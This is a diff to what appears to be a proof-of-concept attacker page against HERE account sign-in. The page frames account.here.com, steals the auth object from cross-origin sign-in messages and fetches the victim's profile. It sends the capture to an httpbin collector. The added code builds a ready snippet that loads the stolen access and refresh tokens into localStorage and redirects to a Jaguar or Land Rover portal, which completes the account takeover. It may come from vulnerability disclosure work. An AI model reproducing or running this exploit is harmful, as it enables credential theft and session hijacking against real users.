@@ -130,7 +130,7 @@
       This attacker page frames <code>account.here.com/ssx-ec</code> with its own origin as the SDK
       callback <code>uri</code>. When HERE posts a sign-in completion payload cross-origin, the page
       steals the full auth object, reads the victim profile from <code>account.api.here.com/user/me</code>,
-      and forwards the combined capture to <code>httpbin</code>.
+      builds a ready Jaguar/Land Rover bootstrap snippet, and forwards the combined capture to <code>httpbin</code>.
     </p>
     <p id="status">Idle.</p>
     <p class="meta">Collector URL: <code id="collector-url"></code></p>
@@ -268,6 +268,48 @@
       };
     }
 
+    function inferPortalUrl(auth, profileFetch) {
+      const realm = String(
+        (profileFetch && profileFetch.json && profileFetch.json.realm) ||
+        auth.realm ||
+        ""
+      ).toLowerCase();
+
+      if (realm === "landrover" || realm === "land rover") {
+        return "https://landrover.here.com/";
+      }
+
+      return "https://jaguar.here.com/";
+    }
+
+    function buildPortalBootstrapSnippet(auth, profileFetch) {
+      const expiresIn = Number(auth.expiresIn) > 0 ? Number(auth.expiresIn) : 3600;
+      const portalUrl = inferPortalUrl(auth, profileFetch);
+      const payload = {
+        userId: auth.userId || null,
+        accessToken: auth.accessToken || null,
+        tokenType: auth.tokenType || "bearer",
+        expiresIn,
+        refreshToken: auth.refreshToken || null,
+        profileUrl: auth.profileUrl || null,
+        realm: (profileFetch && profileFetch.json && profileFetch.json.realm) || auth.realm || null
+      };
+
+      const snippet = `(() => {
+  const auth = ${JSON.stringify(payload)};
+  const expiresAt = Date.now() + ((Number(auth.expiresIn) || 3600) * 1000);
+  localStorage.setItem("token", JSON.stringify(auth.accessToken));
+  localStorage.setItem("userData", JSON.stringify(auth));
+  localStorage.setItem("tokenExpires", JSON.stringify(expiresAt));
+  location.href = ${JSON.stringify(portalUrl)};
+})();`;
+
+      return {
+        portalUrl,
+        portalBootstrapSnippet: snippet
+      };
+    }
+
     async function postToCollector(body) {
       const response = await fetch(collectorUrl, {
         method: "POST",
@@ -304,9 +346,10 @@
       }
       state.lastSensitiveKey = key;
 
-      setStatus("Captured HERE auth payload. Reading victim profile and posting to httpbin.");
+      setStatus("Captured HERE auth payload. Reading victim profile, building the portal bootstrap snippet, and posting to httpbin.");
       const profileFetch = await fetchProfile(extracted.auth);
       state.lastProfileFetch = profileFetch;
+      const bootstrap = buildPortalBootstrapSnippet(extracted.auth, profileFetch);
 
       const sensitiveCapture = {
         capturedAt: new Date().toISOString(),
@@ -315,7 +358,9 @@
         messageOrigin: event.origin,
         sdkMessage: extracted.envelope,
         stolenAuthObject: extracted.auth,
-        profileFetch
+        profileFetch,
+        portalUrl: bootstrap.portalUrl,
+        portalBootstrapSnippet: bootstrap.portalBootstrapSnippet
       };
       state.lastSensitiveCapture = sensitiveCapture;
       window.lastSensitiveCapture = sensitiveCapture;
